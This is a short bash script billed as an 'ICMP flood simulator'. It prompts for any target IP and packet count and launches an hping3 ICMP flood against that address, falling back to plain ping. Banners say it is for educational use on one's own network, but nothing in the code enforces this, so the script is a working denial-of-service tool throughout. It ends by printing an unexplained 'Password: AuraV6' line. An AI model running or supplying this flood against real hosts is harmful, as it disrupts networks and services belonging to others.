#!/bin/bash

# AURA ICMP FLOOD SIMULATOR
# ⚠️ EDUCATIONAL PURPOSE ONLY - Test YOUR own network only ⚠️

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║              🔥 AURA ICMP FLOOD SIMULATOR 🔥                 ║"
echo "║           ⚠️  EDUCATIONAL PURPOSE ONLY ⚠️                    ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

read -p "Enter target IP (YOUR own device only): " TARGET
read -p "Enter number of ping packets to send: " COUNT

echo "🔥 Sending $COUNT ICMP packets to $TARGET..."

# Using ping flood (requires root)
if command -v hping3 &> /dev/null; then
    hping3 -1 --flood -c $COUNT $TARGET
else
    echo "⚠️ hping3 not installed. Using regular ping..."
    ping -c $COUNT $TARGET
fi

echo "✅ ICMP flood simulation complete"
echo "🔐 Password: AuraV6"
